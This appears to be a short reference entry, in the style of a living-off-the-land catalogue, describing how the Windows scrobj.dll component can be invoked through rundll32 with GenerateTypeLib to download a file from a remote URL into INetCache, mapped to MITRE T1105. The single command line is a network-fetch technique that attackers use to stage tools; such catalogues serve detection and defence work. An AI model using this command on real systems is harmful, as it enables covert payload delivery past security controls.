title: Scrobj.dll
html:
Scrobj.dll

Windows Script Component Runtime

Download

Download file from remote location.

rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}

Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache. — MITRE: T1105 — Privileges: User
